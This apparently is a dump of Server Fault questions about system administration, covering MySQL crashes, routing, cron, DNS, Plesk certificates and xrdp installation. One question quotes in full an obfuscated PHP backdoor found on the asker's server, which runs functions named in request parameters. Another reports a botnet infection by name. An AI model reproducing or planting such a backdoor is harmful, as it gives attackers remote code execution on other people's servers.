22:12:04.055378 58:7f:57:0c:e4:80 &gt; c0:56:27:72:a3:5b, ethertype IPv4 (0x0800), length 73: 192.168.1.20.49437 &gt; 128.112.94.34.12341: Flags [P.], seq 112:119, ack 1, win 4117, options [nop,nop,TS val 581516566 ecr 1500230581], length 7
22:12:05.042628 58:7f:57:0c:e4:80 &gt; c0:56:27:72:a3:5b, ethertype IPv4 (0x0800), length 73: 192.168.1.20.49437 &gt; 128.112.94.34.12341: Flags [P.], seq 119:126, ack 1, win 4117, options [nop,nop,TS val 581517541 ecr 1500231577], length 7
</code></pre>

<p>However, when I run the command on <code>eth0</code> (<code>tcpdump -len -i eth0</code>), I get none of the lines above. I've checked my firewall (allowing all connections from LAN to WAN already), route table (<code>192.168.1.x</code> routes to the default gateway), and nothing obvious to me is preventing this.</p>

<p>My question is: <strong>How does the linux kernel route packets from <code>br-lan</code> to <code>eth0</code> on a router?</strong> </p>

<p>What kinds of subsystems or authentication mechanisms does a router go through to let a packet pass through? </p>
","<iptables><router><linux-networking><switch><openwrt>","2016-03-30 01:18:00"
"766944","Is it possibble to reboot a remote MySQL server on Ubuntu from a program or script on a Mac?","<p>I have a client who has a web server hosted with Digital Ocean and they have a weird random MySQL database issue...</p>

<p>1-4 times a month there database server crashes and has to be manually rebooted.</p>

<p>I have not been able to figure out the cause of this random crash so I currently have to do this process each time it happens:  </p>

<ol>
<li>Open a terminal command prompt window</li>
<li>type and run: <code>ssh root@IP-HERE -l root</code>  </li>
<li>type in the server user password: <code>server-user-password</code>  v</li>
<li>type and run the command: <code>service mysql restart</code></li>
</ol>

<p>This reboots the MySQL server and all is great again until a week or 3 later when it randomly happens again and then repeat process.</p>

<hr>

<p>As my client has no server admin experience and doesn't even know what a command prompt/terminal window is or looks like...I need to come up with some solution that would allow anyone, including a monkey to be able to replicate the process outlined above when I am not available!</p>

<p>Some info:</p>

<ul>
<li><strong>Developer/Admin (me)</strong>: running a Windows 7 PC</li>
<li><strong>Client</strong>: is running a Mac OS X (newest OS w/e it is)  </li>
<li><strong>Server</strong>: is running Ubuntu 12.0.4  </li>
</ul>

<p>With that info, would it be possibble to build some sort of 1 click solution script where the client could click and launch a script/program from his Mac which would auto-run the process above to reboot his MySQL server when this emergency issue comes up for him and I am not around to help?</p>
","<ubuntu><mysql><mac>","2016-03-30 07:07:45"
"766948","MySQL server crashes weekly for over a year on Ubuntu with error log entries","<p>My client has a basic LAMP web-server running on Ubuntu 14.x.x at Digital Ocean used to host a WordPress blog site.</p>

<p>Very unfortunately for the past year there has been a random MySQL server crash 2-4 times a month.</p>

<p>Generally it is about 1 time per week.  When it happens I simply have to login to the box with <code>SSH</code> and do a quick <code>service mysql restart</code> command which boots up the MySQL server and all is great again for the next week or so!</p>

<p>The problem is, it's been over a year and I am not always available right when it is detected which can result in extended downtime all because a single command isn't ran =(</p>

<p>Now I need to find a solid proper solution to simply avoid this weekly random crash.  I say random because it is not on a set day every week and it is not even every week, some weeks it skips crashing and runs fine for like 2 weeks!</p>

<p><strong>Latest log entries</strong>  </p>

<p>So the MySQL server crashed again tonight and withing 10 minutes I was able to grab the contents of the MySQL error log file which is posted below.</p>

<p>I am hoping with this log file below and the community to assist that someone might be able to help me finally put this year old nightmare out of misery for good!?</p>

<p>So can anyone make sense of what might be the fatal error below that is happening almost weekly and better as to how I can fix and present it?</p>

<p>I really would appreciate any help as I feel like giving up after all this time with no success</p>

<p>Thanks for any assistance please</p>

<hr>

<p><strong>/var/log/mysql/error.log</strong></p>

<pre><code>160330  2:33:02 [Warning] Using unique option prefix myisam-recover instead of myisam-recover-options is deprecated and will be removed in a future release. Please use the full name instead.
160330  2:33:02 [Note] Plugin 'FEDERATED' is disabled.
160330  2:33:02 InnoDB: The InnoDB memory heap is disabled
160330  2:33:02 InnoDB: Mutexes and rw_locks use GCC atomic builtins
160330  2:33:02 InnoDB: Compressed tables use zlib 1.2.8
160330  2:33:02 InnoDB: Using Linux native AIO
160330  2:33:02 InnoDB: Initializing buffer pool, size = 128.0M
160330  2:33:02 InnoDB: Completed initialization of buffer pool
160330  2:33:02 InnoDB: highest supported file format is Barracuda.
InnoDB: Log scan progressed past the checkpoint lsn 56012194225
160330  2:33:02  InnoDB: Database was not shut down normally!
InnoDB: Starting crash recovery.
InnoDB: Reading tablespace information from the .ibd files...
InnoDB: Restoring possible half-written data pages from the doublewrite
InnoDB: buffer...
InnoDB: Doing recovery: scanned up to log sequence number 56012359513
160330  2:33:02  InnoDB: Starting an apply batch of log records to the database...
InnoDB: Progress in percents: 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 
InnoDB: Apply batch completed
160330  2:33:02  InnoDB: Waiting for the background threads to start
160330  2:33:03 InnoDB: 5.5.38 started; log sequence number 56012359513
160330  2:33:03 [Note] Server hostname (bind-address): '127.0.0.1'; port: 3306
160330  2:33:03 [Note]   - '127.0.0.1' resolves to '127.0.0.1';
160330  2:33:03 [Note] Server socket created on IP: '127.0.0.1'.
160330  2:33:03 [Note] Event Scheduler: Loaded 0 events
160330  2:33:03 [Note] /usr/sbin/mysqld: ready for connections.
Version: '5.5.38-0ubuntu0.14.04.1'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)
160330  2:33:04 [ERROR] /usr/sbin/mysqld: Table './wordpress/wp_aiowps_failed_logins' is marked as crashed and should be repaired
160330  2:33:04 [Warning] Checking table:   './wordpress/wp_aiowps_failed_logins'
160330  2:33:11 [Warning] Using unique option prefix myisam-recover instead of myisam-recover-options is deprecated and will be removed in a future release. Please use the full name instead.
160330  2:33:11 [Note] Plugin 'FEDERATED' is disabled.
160330  2:33:11 InnoDB: The InnoDB memory heap is disabled
160330  2:33:11 InnoDB: Mutexes and rw_locks use GCC atomic builtins
160330  2:33:11 InnoDB: Compressed tables use zlib 1.2.8
160330  2:33:11 InnoDB: Using Linux native AIO
160330  2:33:11 InnoDB: Initializing buffer pool, size = 128.0M
InnoDB: mmap(137363456 bytes) failed; errno 12
160330  2:33:11 InnoDB: Completed initialization of buffer pool
160330  2:33:11 InnoDB: Fatal error: cannot allocate memory for the buffer pool
160330  2:33:11 [ERROR] Plugin 'InnoDB' init function returned error.
160330  2:33:11 [ERROR] Plugin 'InnoDB' registration as a STORAGE ENGINE failed.
160330  2:33:11 [ERROR] Unknown/unsupported storage engine: InnoDB
160330  2:33:11 [ERROR] Aborting

160330  2:33:11 [Note] /usr/sbin/mysqld: Shutdown complete

160330  2:33:12 [Warning] Using unique option prefix myisam-recover instead of myisam-recover-options is deprecated and will be removed in a future release. Please use the full name instead.
160330  2:33:12 [Note] Plugin 'FEDERATED' is disabled.
160330  2:33:12 InnoDB: The InnoDB memory heap is disabled
160330  2:33:12 InnoDB: Mutexes and rw_locks use GCC atomic builtins
160330  2:33:12 InnoDB: Compressed tables use zlib 1.2.8
160330  2:33:12 InnoDB: Using Linux native AIO
160330  2:33:12 InnoDB: Initializing buffer pool, size = 128.0M
InnoDB: mmap(137363456 bytes) failed; errno 12
160330  2:33:12 InnoDB: Completed initialization of buffer pool
160330  2:33:12 InnoDB: Fatal error: cannot allocate memory for the buffer pool
160330  2:33:12 [ERROR] Plugin 'InnoDB' init function returned error.
160330  2:33:12 [ERROR] Plugin 'InnoDB' registration as a STORAGE ENGINE failed.
160330  2:33:12 [ERROR] Unknown/unsupported storage engine: InnoDB
160330  2:33:12 [ERROR] Aborting

160330  2:33:12 [Note] /usr/sbin/mysqld: Shutdown complete
</code></pre>

<hr>
","<ubuntu><mysql>","2016-03-30 07:30:27"
"938206","Rogue process on Ubuntu","<p>A VPS running Ubuntu 14.04.5 LTS is consuming nearly 300% of CPU capacity.  It is identified running <code>top</code> as <code>cER6XH</code>.</p>

<p>Is there any way to track down what this process is and why it may be going rogue?</p>
","<ubuntu-14.04>","2018-11-01 13:24:17"
"857637","Can admin monitor what websites has be accessed?","<p>I am using my company laptop, where is being monitored by company admin.
They have install Windows 7 OS on all laptops and some other security packages. </p>

<p>Currently I am usnig laptop outside my company network (Home Intenet connection). I have installed VM box and using Ubuntu inside it. IF I open some websites on ubuntu VM box. Would company admin able to monitor it?</p>
","<security><linux-networking><remote-desktop-gateway><network-security>","2017-06-24 06:18:47"
"982246","Mint, unable to install new version of NodeJS and NPM","<p>I am unable to install a newer version of NodeJS than 8.10.0 on my Linux Mint machine. I've added repositories of newer versions (10.x and 11.x) via bash but neither works, apt does not find any updates for NodeJS nor NPM package. I've also tried cleaning apt cache, but that didn't work either. </p>

<p>How do I fix this?</p>
","<node.js><npm>","2019-09-06 17:23:10"
"938314","Bandwidth to hosts abroad","<p>I have a server with 1 Gbps uplink. Testing gives me a download/upload speed of approx 600 Mbps to servers nearby in Europe, and 100 Mbps to servers in US.</p>

<p>I want to host a server and I need to know if I will have enough bandwidth.</p>

<p>If I upload to multiple hosts in the US, will the total speed be limited at 100 Mbps? (the same speed I get when trying to Download/Upload to 1 server in the US).</p>
","<bandwidth><network-speed>","2018-11-02 06:09:05"
"857765","How much server RAM docker-machine instance needs?","<p>I have a docker installed at OS X and using docker-machine with my host provider server. The server OS is CoreOS, I have 3 lightweight sites with NGINX, Mongo and MySQL instances. Sometimes sites down and provider's support suggesting me with low RAM, but 2GB RAM isn't sufficient for such sort of thing?</p>
","<docker><coreos><docker-compose><docker-machine>","2017-06-25 14:48:36"
"857845","AWS Route 53 Pricing","<p>I have set up a Tomcat Server on AWS Elastic Beanstalk Load Balancer. I also have a domain name registered with 1&amp;1, e.g. www.example.com.</p>

<p>I would like to point the domain name at the Elastic Load Balancer.</p>

<p>I have <a href=""https://stackoverflow.com/questions/13877764/aws-loadbalancer-requires-an-cname-record-but-this-overrides-my-mx-records"">read</a> that the best option is to use AWS's <code>Route 53</code> and that it is relatively affordable. However, when I look at it's pricing:</p>

<p><a href=""https://aws.amazon.com/route53/pricing/"" rel=""noreferrer"">https://aws.amazon.com/route53/pricing/</a></p>

<p>It says that there are various costs depending on usage, plus $50/month. This is opposed to 1&amp;1 of about $10/year for a domain.</p>

<p><strong>Question1</strong></p>

<p>Am I reading the AWS Route 53's pricing correctly?</p>

<p><strong>Question2</strong></p>

<p>If I don't use Route 53, and rather 'use a CNAME record to route queries to your load balancer', does that just redirect the domain name (<code>www.example.com</code>) to the ELB (<code>example.us-west-2.elasticbeanstalk.com/</code>)? Ie, does it just change the url to <code>example.us-west-2.elasticbeanstalk.com/</code>? If this is the case, it's not suitable, because the domain name in the browser url needs to be www.example.com for SEO and the https certificate lets secure traffic on that name.</p>

<p>Thanks</p>
","<amazon-web-services><amazon-route53><elastic-beanstalk>","2017-06-26 06:59:11"
"767085","GCP Datastore Dashboard says ""Project does not exist""","<p>After some testing calls to Google Datastore from our GKE cluster (unfortunately, cannot tell exactly what the calls were), we experienced a strange problem with our Datastore.</p>

<p>When entering the Datastore Dashboard, there's the usual two dropdowns for <em>namespace</em> and <em>kind</em>, but below that we have a red-tinted info ""The project mosaiqio does not exist"".</p>

<p>Any ideas what would happen, and - more importantly how to fix this issue? We'd rather avoid recreating everything related to the project.</p>

<p><a href=""https://i.sstatic.net/n8wkW.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/n8wkW.png"" alt=""The Datastore Dashboard - project does not exist""></a></p>

<p><a href=""https://i.sstatic.net/ID4Oy.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ID4Oy.png"" alt=""The Datastore Entities - no namespaces""></a></p>

<p><a href=""https://i.sstatic.net/SZ98h.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/SZ98h.png"" alt=""The Datastore Admin not accessible""></a></p>
","<google-cloud-platform><datastore>","2016-03-30 15:47:31"
"767166","Add date using echo without calculating","<p>I should add the line to /var/spool/cron/crontabs/root on my ESXi: <code>/bin/echo</code> <code>""0 3 * * 6 /ghettoVCB-master/ghettoVCB.sh -g /ghettoVCB-master/text.conf -f /ghettoVCB-master/text.list &gt; /var/log/ghettoVCB-month-$(date +%m)-week-$((($(date +\%d)-1)/7+1)).log""</code> <code>&gt;&gt;</code> <code>/var/spool/cron/crontabs/root</code>.</p>

<p>But this comandline adds a reasult of <code>$(date +%m)</code> and <code>$((($(date +\%d)-1)/7+1))</code>.</p>

<p>How to add this line as a formula? Thanks in advance.</p>
","<vmware-esxi><cron><date><echo>","2016-03-30 22:27:36"
"767231","Php script - Have I been hacked","<p>Here is the PHP script I have found at the root of each of my website folder.
Script name is fcb.php</p>

<p>Content is : </p>

<p><code>&lt;? $GLOBALS['_1303753477_']=Array(base64_decode('YX' .'JyYXlfZGlmZl91a2V5'),base64_decode('c3RyaXBz' .'bG' .'F' .'z' .'aGVz')); ?&gt;&lt;? function _1935386521($i){$a=Array('cGFzc3dvcmQ=','cmVfcGFzc3dvcmQ=','bG9naW4=');return base64_decode($a[$i]);} ?&gt;&lt;?php @$GLOBALS['_1303753477_'][0](@array((string)$_REQUEST[_1935386521(0)]=&gt;round(0+0.25+0.25+0.25+0.25)),@array((string)$GLOBALS['_1303753477_'][1]($_REQUEST[_1935386521(1)])=&gt;round(0+0.4+0.4+0.4+0.4+0.4)),$_REQUEST[_1935386521(2)]); ?&gt;</code></p>

<p>Can somebody explain what this does?
Thanks.</p>
","<php><apache-2.4><hacking>","2016-03-31 05:28:54"
"767332",".htccess redirect from non-www https to www-https","<p>I want to redirect <a href=""https://example.com"" rel=""nofollow noreferrer"">https://example.com</a> to <a href=""https://www.example.com"" rel=""nofollow noreferrer"">https://www.example.com</a> for my website. Can you help me with the code to put it on .htaccess file. the site is in magento.</p>
","<linux><ssl><redirect><https>","2016-03-31 13:44:38"
"982489","SQL Server 2019 RC in Production?","<p>I have a MS SQL Server 2008R2 running our two main databases.
I have a few problems with MS SQL Server 2008R2, and would like to upgrade ASAP.</p>

<p>i did however not get the funds to buy a 2017, only for a 2019 when it comes out.</p>

<p>So I have the following options:</p>

<p>1) 2008R2-->2017(eval version)-->2019 (as soon as it is out)</p>

<p>2) 2008R2-->2019RC-->2019 full (as soon as it is out)</p>

<p>3) Stay on 2008R2 until 2019 is out.</p>

<p>I think that 1 is not allowed licencing-wise? Would 2 be ok? How big would the risk be of running the 2019RC?</p>

<p>Thank you
Daniel</p>
","<sql-server>","2019-09-09 08:35:25"
"767409","Is it possible to set up a web server on the same domain used by Active Directory?","<p>I'm a web developer at a large-ish organization and our web site is hosted by our IT department. Our website will not load without the ""www"" subdomain in front of it and IT says that it's because Active Directory must use the primary domain and so the web server must use a subdomain. They say it's not possible to fix it. I'm highly skeptical of this claim because this hasn't been a problem anywhere else I've worked or heard of but I'm not familiar enough with the technologies in question to argue the point.</p>

<p>So my question is, does this sound reasonable? Is it not possible to use AD on the same domain as a web server? Thanks!</p>
","<active-directory><web-server><routing>","2016-03-31 19:58:54"
"767465","Will e-mail addresses for different domains arrive at the same mailbox if MX records are identical?","<p>Say I have bluppfisk@bluppfisk.com, but I want bluppfisk@bluppfisk.co.uk to be treated as an alias without setting up a forward. Can I just configure the MX record for bluppfisk.co.uk to point to mailserver.bluppfisk.com?</p>

<p>The reason I'm asking is that I am in the process of transferring domains and I want to test whether everything is working first with a less critcial domain alias (bluppfisk.co.uk) before moving over bluppfisk.com which currently receives all the mail.</p>
","<domain-name-system><email><mx-record>","2016-04-01 02:28:36"
"767529","User management with cronjob","<p>In my organization, we want to implement a user management standard after an utter chaos. Where we(organization) and the client was able to access root user and they made changes which took down the server. However, the blame came on us for playing with the configuration files. </p>

<p>To resolve any issues in the future we have designed a model and it would be helpful to get inputs whether it's best practice or not.</p>

<p><strong>Step 1 - Root user and non-root users with sudo access</strong></p>

<p>We want to have users in the following fashion - </p>

<ul>
<li>Root user -> Either disabled to log in through SSh for security purpose or access only through SSH key and paraphrase. Root account will be only accessible by one member from my team.</li>
<li>Two non-root users -> One for my team and other for the client.</li>
</ul>

<p><strong>Step 2 - Non-root users with limited access to the services</strong></p>

<p>These will be individual users having access to only one service.</p>

<ul>
<li>Complete access to server - Apache or Nginx</li>
<li>Complete access to MySQL</li>
</ul>

<p>We can have more users to handle different services. And no other user can access a different service, except for the allotted service.</p>

<p><strong>Step 3 - Auditing each user's commands in a log file</strong></p>

<ul>
<li>We want to run a cronjob which logs each and every command executed on the server by any user.</li>
<li>We need this to identify who made the changes and when.</li>
</ul>

<p>For auditing I looked for few solutions and most of them involved to start a command, like <em>script</em>, before starting your work. I want something to run at all the times without any manual intervention. Even when the server reboots.</p>

<p>Please let me know if this is something which we can do or is there any better approach to manage them.</p>
","<linux><permissions><cron><user-management><user-permissions>","2016-04-01 10:22:53"
"982623","Hyper-V: after external switch setup - host lose internet in browser (but I still connected to it)","<p>I have a dedicated server with Windows 10 - far away from me, in datacenter.</p>

<p>I create external switch in Hyper-V to connect my VMs to Internet with ""white"" IPs.
I attach it to NIC with internet (server also have other NIC, but it not connected, maybe for datacenter local network, I think).</p>

<p>When I apply this external switch, my host lost internet in browser (!), but I still have connection by RDP without any problem (!). Somehow I see my server in Internet, but my server not see Internet.</p>

<hr>

<p>On previous server I have connection with external switch without any problems. What can be cause of problem? Maybe it something with new 'Default Switch' in Hyper-V, that cannot be deleted? </p>
","<windows><networking><hyper-v>","2019-09-10 04:48:40"
"982645","Deploying servers by one or several document files with ease","<p>Is there any similar way of deploying many server instances and server programs (as well as networking settings) by one or several document files?</p>

<p>I heard there is some similar one such as Chef or CloudFormation, but I am not sure whether they are.</p>

<p>If there is one, can I use it directly on AWS or Azure?</p>
","<amazon-web-services><azure><deployment>","2019-09-10 08:06:00"
"982662","Detect and clean nymaim on Ubuntu server?","<p>I'm trying to figure out why our server has been block at Spamhaus. It comes up with:</p>

<blockquote>
  <p>139.162.208.xxx is listed in the XBL, because it appears in:</p>
  
  <p>CBL Lookup</p>
</blockquote>

<p>Following the link, it says:</p>

<pre><code>This IP address is infected with, or is NATting for a machine infected with the ""nymaim"" malicious botnet.

""nymaim"" is also known as ""Gamarue"".

More information about Gamarue can be obtained from Proofpoint, and Microsoft.

Gamarue is involved with a variety of malicious things, including backdoor downloads, Banking Trojans and Ransomware.

This was detected by a TCP connection from ""139.162.208.xxx"" on port ""36752"" going to IP address ""216.218.185.xxx"" (the sinkhole) on port ""80"".

The botnet command and control domain for this connection was ""www.ltaet.com"".

This detection corresponds to a connection at Mon Sep 9 09:48:26 2019 UTC (this timestamp is believed accurate to within one second).
</code></pre>

<p>How would you go about cleaning this up? I've tried a few malware detection tools, but none of them ever come up with anything. </p>

<p>The OS is <strong>Ubuntu 16.04</strong></p>

<p>Thanks</p>
","<unix><ubuntu-16.04><malware>","2019-09-10 10:09:15"
"857891","Updating .net on all machines in the same domain?","<p>I have a ton of machines without internet (~100). I need to update powershell/.net on all of them. They all lie within the same domain. What is the best option? I don't have anything like Chef or SCCM preconfigured on these machines.</p>
","<windows><deployment><chef><sccm>","2017-06-26 12:41:32"
"857952","Virtual firewall on top of KVM","<p>I plan on running a dedicated firewall distro, but I want to run it in a KVM VM.</p>

<p>I have a machine with 2 NIC's, which I intend to assign to WAN and LAN. However, both NIC's do not support VT-d, so PCI-passthrough is a big no-go. Therefore, I had the setup in mind of using a macvtap in private mode for the WAN-interface and a standard bridge for the LAN-interface.</p>

<p>I was just wondering: what do I do with that WAN-interface? Let's say it's called eth0 and there's a macvtap in private mode linked to it, which gets the firewall WAN interface assigned. How do you configure the eth0-interface itself in the linux host? Do you set it to manual mode, thereby not assigning it an IP? Do you give it an IP, static or DHCP? Do you protect it also with IPTABLE rules?</p>

<p>I'm just wondering, how do you implement this type of setup securely that protects both the host and the virtual firewall guest from the WAN-side?</p>

<p>Any advice you can give is appreciated!</p>
","<firewall><kvm-virtualization>","2017-06-26 17:34:14"
"767694","Failed to open a port in my ubuntu machine","<p>Recently I added to iptables a rule which was supposed to allow incoming traffic through port 993. The rule I used is the one shown below:</p>

<pre><code>sudo iptables -A INPUT -p tcp --dport 993 -j ACCEPT
</code></pre>

<p>After I entered the rule, I ran ""iptables-save > /etc/iptables/rules.v4"" and rebooted the server. However when I use the telnet command to check the port I am getting following error.</p>

<p>telnet localhost 993</p>

<p>it tells me the connection is refused by the host (my server). This is not only happening to this port but to other ports I try to open. Am I doing something wrong, running a wrong command, etc? Please help me.</p>
","<firewall>","2016-04-02 04:20:19"
"767717","df -h shows 100% usage but sizes don't add up","<p>I have a situation where my root filesystem is supposed to have plenty of free space, but Debian behaves as if it had no free space left. Non-root users even refute to write anything complaining about the lack of free space. I.e. for example:</p>

<pre><code>~$ echo ""qwertyu"" &gt; test
-bash: echo: write error: Spazio esaurito sul device
</code></pre>

<p>(Sorry about the language, I didn't install the server myself. The error reads ""ran out of free space on the device"").
But root writes to the same directory without complaints. Also if I do df -h as root I get this:</p>

<pre><code>/# df -h
File system                                             Dim. Usati Dispon. Uso% Montato su
rootfs                                                   48G   46G       0 100% /
udev                                                     10M     0     10M   0% /dev
tmpfs                                                   397M   88M    310M  23% /run
/dev/disk/by-uuid/8063903c-80ad-4f72-81b0-cd67dbd48fc7   48G   46G       0 100% /
tmpfs                                                   2,0G     0    2,0G   0% /dev/shm
tmpfs                                                   2,0G     0    2,0G   0% /sys/fs/cgroup
tmpfs                                                   5,0M     0    5,0M   0% /run/lock
tmpfs                                                   100M     0    100M   0% /run/user
/dev/sdb1                                                99G  9,6G     84G  11% /disk2
</code></pre>

<p>But du entries don't add up:</p>

<pre><code>/# du -sh /* | sort -hr
du: impossibile accedere a ""/proc/12905/task/12905/fd/4"": File o directory non esistente
du: impossibile accedere a ""/proc/12905/task/12905/fdinfo/4"": File o directory non esistente
du: impossibile accedere a ""/proc/12905/fd/4"": File o directory non esistente
du: impossibile accedere a ""/proc/12905/fdinfo/4"": File o directory non esistente
9,4G    /disk2
3,8G    /var
3,2G    /data
1,6G    /usr
277M    /opt
130M    /root
129M    /lib
88M /run
45M /home
18M /boot
7,6M    /bin
6,0M    /sbin
5,2M    /etc
28K /tmp
16K /lost+found
8,0K    /media
4,0K    /srv
4,0K    /selinux
4,0K    /mnt
4,0K    /lib64
0   /vmlinuz
0   /sys
0   /proc
0   /initrd.img
0   /dev
</code></pre>

<p>(Error says ""Cannot access yada yada: No such file or directory"").
Be aware that /disk2 is a mount for an another partition.</p>

<p>Checking the filesystem didn't help either:</p>

<pre><code>/# e2fsck -n /dev/sda1
e2fsck 1.42.5 (29-Jul-2012)
Warning!  /dev/sda1 is mounted.
Attenzione: essendo un controllo a sola lettura, il journal non verrà ripristinato.
/dev/sda1: clean, 86568/3145728 files, 11666588/12563712 blocks
</code></pre>

<p>(""Being it a read-only check, the journal will not be recovered"", but I guess the ""clean"" just below rules out this possibility).</p>

<p>Any idea what might be going on here? Consider the system runs on a VM somewhere and I can only access it via SSH.</p>
","<linux><debian><filesystems><disk-space-utilization>","2016-04-02 10:48:44"
"767733","Setting up SSH with the correct user rights","<p>I want to setup my SSH connection correctly. As many tutorials told me, it is not recommended to use the root account of Ubuntu server. So I would rather use my standard account ""Simon"" to upload files and transfer terminal commands.</p>

<p>When I run 'sudo su' I am prompted to type the standard password for my user account Simon in order to gain root permissions. I am pretty sure, that instead I should get asked for the root password, shouln't I? How can I fix this?</p>
","<ssh><sudo>","2016-04-02 13:20:21"
"767803","Apache 2.4 Stops Serving Request","<p>This is something new, Apache is running fine as server on a Windows Server 2012. There is plenty of RAM and CPU and this is the only thing this server does, is an Apache server. </p>

<p>I can restart the service and it will run fine for a little bit then stop serving pages on all sites. I have messed with the worker threads to find a fine line but still having issues. </p>

<p>Currently settings in httpd-mpm.conf file</p>

<pre><code>&lt;IfModule mpm_prefork_module&gt;
    StartServers             10
    MinSpareServers          10
    MaxSpareServers         20
    MaxRequestWorkers      250
    MaxConnectionsPerChild   3000
&lt;/IfModule&gt;
</code></pre>

<p>At this point I am not sure what is going on and have tried several suggestions from various websites. </p>

<p>Specs of Server:
Windows 2012 R2 VM
2 GB of RAM 1 GB available
Running on an SSD storage</p>

<p>This server connects to a MySQL database on the same network as well, there is not latency between the servers.</p>
","<apache-2.4>","2016-04-03 01:36:50"
"767829","Show files to be patched on .diff file and determine if they are patched or not","<p>Having a <code>.diff</code> patch file, I'm trying to take actions in a shell script depending on if files listed in <code>.diff</code> file are: 1) already patched, 2) not patched, 3) not patchable.</p>

<p>I found no way on GNU Patch to show this information in a non-interactive basis.</p>

<p>Also would be useful knowing which files are to be patched without patching them. This seem to be easier filtering the <code>.diff</code> file but would be great if GNU Patch had these features.</p>

<p>Some suggestion on this?</p>
","<patch-management><diff>","2016-04-03 06:17:17"
"984045","Can one GMSA ( Group managed service account) be applied to multiple computers?","<p>I read that MSA cannot be applied to more than one computer, Can gMSA be linked to more than one computer? </p>
","<active-directory>","2019-09-12 21:23:39"
"767963","Dns errors in the domain","<p>The Domain name is: www.intralifeindia.com</p>

<p>I updated all records. when i checked up DNS details using <a href=""http://dnscheck.pingdom.com"" rel=""nofollow noreferrer"">http://dnscheck.pingdom.com</a> i found an error as : </p>

<pre><code>Too few IPv4 name servers (1).

Only one IPv4 name server was found for the zone. You should always have at least two IPv4 name servers for a zone to be able to handle transient connectivity problems. 
</code></pre>

<p>Already two name servers are added as i checked that. </p>

<p>Then SOA ERROR SAYS:</p>

<pre><code>SOA MNAME for intralifeindia.com (ns1.secureserver.net) is not authoritative.

The name server listed as the original or primary source of data for this zone does not answer authoriative. This is probably due to a misconfiguration - perhaps the SOA MNAME is not set up as name server for the zone.

Delivery over IPv4 to info@s192-169-188-190.secureserver.net could not be done.


Failed to deliver email for SOA RNAME of intralifeindia.com (info.s192-169-188-190.secureserver.net) using info@s192-169-188-190.secureserver.net.

DNSCheck failed to deliver email to the email address listed as the one responsible for the zone.
</code></pre>

<p>I went to domain details i can not change SOA primary name server. It is : Primary NameServer   info432270.mars.orderbox-dns.com</p>
","<domain-name-system><dns-hosting><dns-zone>","2016-04-04 06:55:12"
"858152","Let's Encrypt plesk extension creates invalid vhost config","<p>I've installed the <a href=""https://ext.plesk.com/packages/f6847e61-33a7-4104-8dc9-d26a0183a8dd-letsencrypt"" rel=""nofollow noreferrer"">Let's Encrypt extension</a> in Plesk, which automatically renews the certificates served to Apache. But today I've received the following email which reminds me to renew my certificate:</p>

<blockquote>
  <p>From: Let's Encrypt Expiry Bot 
  Date: 2017-06-27 0:13 GMT+02:00
  Subject: Let's Encrypt certificate expiration notice for domain ""***.ch""
  To: info@***.ch</p>
  
  <p>Hello,</p>
  
  <p>Your certificate (or certificates) for the names listed below will
  expire in 19 days (on 16 Jul 17 18:40 +0000). Please make sure to
  renew your certificate before then, or visitors to your website will
  encounter errors.</p>
  
  <p>[...}</p>
</blockquote>

<p>When I try to renew the certificate in the extension settings, I get the following error message:</p>

<pre><code>Error: Let's Encrypt SSL certificate installation failed: Challenge marked as invalid.
Details: Fetching http://***.be/.well-known/acme-challenge/***: Error getting validation data 
</code></pre>

<p>That's when the webserver stopped working and starting it again doesn't work:</p>

<pre><code># service apache2 start
 * Starting web server apache2
Syntax error on line 54 of /etc/apache2/plesk.conf.d/vhosts/****.ch.conf:
SSLCertificateFile: file '/opt/psa/var/certificates/cert-***' does not exist or is empty
Action 'start' failed.
The Apache error log may have more information.
</code></pre>

<p>The configured certificate file is missing, what happened and how can I fix this?</p>
","<ubuntu><apache-2.4><lets-encrypt><plesk>","2017-06-27 14:03:34"
"768009","How to assign a static IP address to windows 10 machine at boot time?","<p>I want to assign a static ip address to a windows 10 virtual machine at booting time. How can I do it? For example, as in linux we can modify /etc/network/interfaces file so is there any similar way for windows 10 also?</p>
","<ip-address><windows-10>","2016-04-04 12:16:52"
"858197","Run a script as root from the user GUI","<p>So, I have a script that needs to install a software but the script needs to be run as root. </p>

<p>I have created a desktop icon on the GUI (using Ubuntu desktop) where ideally, the user will click this icon, it will prompt for password and then run the script as root.</p>

<p>So far the script does what is intended if ran as root, but not as the user.
Script looks like this:</p>

<pre><code> #!/bin/bash -l

zenity --question --text ""This script will reboot after installation is complete"" --title=""Warning\!"" 2&gt; /dev/null
if [ $? = 0 ]; then
  install dependencies 
  dpkg -i package.deb
  etc
fi

reboot
</code></pre>

<p>However, if I click on the icon to run the script, it loads and it doesn't do anything, then I check the logs and realize that it fails: <code>sudo: no tty present and no askpass program specified</code> I know I can modified the sudoers files but I do not want to do this as I need to keep this user independent.</p>

<p>Is there a way to force when running the script to ask the user to become root? or to force the GUI to ask for a password? what is the best way to get this done? I need users to run this program but I need to run the program as root and sudo is not doing it for whatever reason.</p>
","<ubuntu><bash><sudo>","2017-06-27 18:25:19"
"984264","Unable to install xrdp on CentOS 7.6","<p>I'm a bit of a novice Linux user and I'm trying to prepare a CentOS VM through Azure.  I have it built and can operate on it through the serial console on the Azure portal.  I've installed GNOME and now I'm trying to install xrdp so I can access it through RDP.</p>

<p>The instructions I found said a requirement first was to first install the EPEL repo which I did this way:</p>

<p><code>rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</code></p>

<p>That completed with no issue.</p>

<p>But when I tried to actually install xrdp this way:</p>

<p><code>yum -y install xrdp tigervnc-server</code></p>

<p>I get errors that look like this:</p>

<p><code>Error: Package: 1:xrdp-selinux-0.9.11-1.el7.x86_64 (epel)
           Requires: selinux-policy &gt;= 3.13.1-252.el7.1
           Installed: selinux-policy-3.13.1-229.el7_6.15.noarch (@updates)
               selinux-policy = 3.13.1-229.el7_6.15
           Available: selinux-policy-3.13.1-229.el7.noarch (base)
               selinux-policy = 3.13.1-229.el7
